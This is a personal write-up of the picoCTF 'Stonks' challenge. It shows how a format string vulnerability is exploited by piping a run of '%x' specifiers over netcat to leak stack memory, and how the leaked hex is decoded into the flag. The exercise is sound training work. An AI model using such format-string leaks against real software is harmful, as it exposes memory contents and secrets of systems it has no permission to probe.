# Binary Exploitation

### Stonks

Here you are given a file `vuln.c` and told that there is a bot to trade "stonks" using AI and ML. It looks to be  service listening on `mercury.picoctf.net 16439` that you can interact with via netcat (`nc`). Probably need to spend some time looking at `vuln.c` to see what is going on...

Well, I somewhat quickly assertained what was going on (format string vulnerability), but I then proved to myself that __I had abosolutely no idea how to actually exploit__ or take advantage of it. I spent *way* too much time trying to figure things out. 

What I ended up doing was creating a file called `inputs` that looks like the following:

```text
1
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
```

This represents the two inputs I wanted to provide to the program. I then called the program as you would normally expect:

```bash
$ nc mercury.picoctf.net 16439 < inputs
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
Buying stonks with token:
9aa0390804b00080489c3f7eecd80ffffffff19a9e160f7efa110f7eecdc709a9f18029aa03709aa03906f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6263376365616336ff8a007d
Portfolio as of Thu Oct 28 20:20:27 UTC 2021


2 shares of I
6 shares of WJ
22 shares of W
55 shares of ZCVR
1903 shares of Z
Goodbye!
```

I assumed that the flag would start with `picoCTF{` as most of them had, so I confirmed that I knew that the little-endian hex version of the start of that string was `6f636970`. I identified that portion in the byte string above, took from there to the end and dumped it into cyberchef. I then used a `swap endianness` tool complete with `from hex` and I had the flag.

I made that *__way__* too difficult.

One helpful line of code that I don't want to loose:

```bash
$ python3 -c "print('%x'*30)"
```

